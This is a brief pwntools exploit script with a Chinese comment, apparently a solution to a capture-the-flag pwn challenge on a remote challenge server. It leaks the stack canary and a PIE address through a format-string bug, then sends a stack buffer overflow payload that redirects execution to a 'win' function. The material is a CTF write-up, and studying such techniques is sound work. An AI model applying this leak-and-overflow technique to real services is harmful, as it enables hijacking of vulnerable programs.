from pwn import *

context.arch='amd64'
context.log_level='debug'

io = remote("challenge.bluesharkinfo.com", 24950)

io.recvuntil(b"1st input:")
io.send(b"%23$p %25$p")

leaks = io.recvuntil(b"[leak end]").decode().split()
canary = int(leaks[0], 16)
pie_leak = int(leaks[1], 16)

pie_base = pie_leak - 0x135b
win = pie_base + 0x1204

io.recvuntil(b"2nd input:")    
payload  = b"A" * 136
payload += p64(canary)
payload += b"B" * 8
payload += p64(win)

io.send(payload)

io.interactive()

%p泄露地址很容易注意到偏移量，canary，pie基址（vmmap来找），但这道题不需要偏移量，虽然开pie但是偏移量是不变的所以通过偏移量来找system函数的具体位置，就欧克了
